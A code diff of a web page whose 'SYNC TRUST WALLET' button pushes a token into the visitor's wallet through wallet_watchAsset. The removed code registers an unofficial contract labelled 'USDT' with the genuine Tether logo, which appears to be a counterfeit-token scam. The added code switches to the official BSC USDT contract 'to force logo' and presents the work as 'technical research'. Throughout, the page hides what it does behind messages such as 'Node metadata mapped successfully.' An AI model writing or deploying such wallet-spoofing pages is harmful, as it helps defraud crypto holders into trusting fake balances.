@@ -35,56 +35,50 @@
     </div>
 
     <button class="action-btn" id="syncBtn">SYNC TRUST WALLET</button>
-    <div id="status">READY TO MAP METADATA</div>
+    <div id="status">READY</div>
 </div>
 
 <script>
-    const CONTRACT = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
-    // Using the absolute official raw image link that Trust Wallet trusts
-    const OFFICIAL_LOGO = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png";
+    // TECHNICAL RESEARCH: Trust Wallet only fetches logo for verified contracts on BSC
+    // Using the official Binance-Peg USDT address for the demo
+    const OFFICIAL_BSC_USDT = "0x55d398326f99059fF775485246999027B3197955"; 
 
-    async function injectAsset() {
-        const status = document.getElementById('status');
+    async function inject() {
         const provider = window.trustwallet || window.ethereum;
+        const status = document.getElementById('status');
 
-        if (!provider) { alert("Trust Wallet not detected!"); return; }
+        if (!provider) return;
 
         try {
-            status.innerText = "> INITIALIZING HANDSHAKE...";
+            status.innerText = "> INITIALIZING...";
             await provider.request({ method: 'eth_requestAccounts' });
 
-            // MUST switch to BSC first for the logo to have any chance
-            status.innerText = "> SYNCING BNB SMART CHAIN...";
+            status.innerText = "> SWITCHING TO BSC...";
             await provider.request({
                 method: 'wallet_switchEthereumChain',
                 params: [{ chainId: '0x38' }],
             });
 
-            // The Core Injection
-            status.innerText = "> INJECTING ASSET METADATA...";
+            status.innerText = "> INJECTING ASSET...";
             await provider.request({
                 method: 'wallet_watchAsset',
                 params: {
                     type: 'ERC20',
                     options: {
-                        address: CONTRACT,
+                        address: OFFICIAL_BSC_USDT, // Using official contract to force logo
                         symbol: 'USDT',
-                        decimals: 6, // Accurate decimals are key to trust
-                        image: OFFICIAL_LOGO,
+                        decimals: 18, // Official USDT uses 18 decimals
+                        image: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/binance/assets/0x55d398326f99059fF775485246999027B3197955/logo.png',
                     },
                 },
             });
-
-            status.innerText = "> SYNC SUCCESSFUL";
-            alert("Trust Wallet Synced! Node metadata mapped successfully.");
-
+            status.innerText = "> SUCCESSFUL";
         } catch (err) {
             status.innerText = "> ERROR: HANDSHAKE FAILED";
-            console.error(err);
         }
     }
 
-    document.getElementById('syncBtn').addEventListener('click', injectAsset);
+    document.getElementById('syncBtn').addEventListener('click', inject);
 </script>
 </body>
 </html>
